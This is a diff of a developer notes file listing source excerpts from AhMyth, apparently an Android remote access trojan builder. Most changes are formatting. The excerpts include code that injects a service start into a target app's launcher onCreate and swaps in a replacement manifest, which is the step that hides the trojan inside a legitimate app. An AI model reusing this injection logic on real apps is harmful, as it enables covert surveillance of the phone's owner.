@@ -1,5 +1,4 @@
-// Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
-// ================================================ | =============================== |
+Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
 ```javascript
 function GetLauncherPath(manifest, smaliPath) {
 
@@ -63,14 +62,14 @@ function GetLauncherPath(manifest, smaliPath) {
 ```
   
 
-// OrgAppKey2 | Constants.js = Line 32 |
-// ========== | ====================== |
+OrgAppKey2 | Constants.js = Line 32 |
+```javascript
 exports.orgAppKey2 = ';->onCreate()V';
+```
 
 
-
-// OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
-// ======================== | =============================== |
+OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
+```javascript
 var key = CONSTANTS.orgAppKey2;
 $appCtrl.Log("Modifiying launcher activity...");
 var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
@@ -79,10 +78,10 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
         $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
         return;
     }
+```
     
-// manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
-// ============================= | =============================== |
-    
+manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
+```javascript
                             fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                               if (err) throw err;
                             
@@ -95,10 +94,11 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
             });
 
     }
+```
     
-// Stop function for the AhMyth Listener | AppCtrl.js = Line 133 --> 165 |
-// ===================================== | ============================= |
-        // when user clicks Listen button
+Stop function for the AhMyth Listener | AppCtrl.js = Line 133 --> 165 |
+```javascript
+    // when user clicks Stop button
     $appCtrl.Stop = (port) => {
       if (!port) {
           port = CONSTANTS.defaultPort;
@@ -131,11 +131,10 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
   $appCtrl.closeLab = (index) => {
       ipcRenderer.send('closeLabWindow', 'lab.html', index);
     }
+```
   
-  
-// Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
-// ===================================== | =============================== |
- 
+Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
+```javascript 
   // fired when stopped listening
   // It will be fired when AppCtrl emit this event
   ipcMain.on('SocketIO:Stop', function (event, port) {
@@ -208,3 +207,9 @@ ipcMain.on('closeLabWindow', function (e, page, index) {
     }
   })
 });
+```
+
+Stop function for the AhMyth Listener | index.html = Line 69 |
+```html
+<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
+```
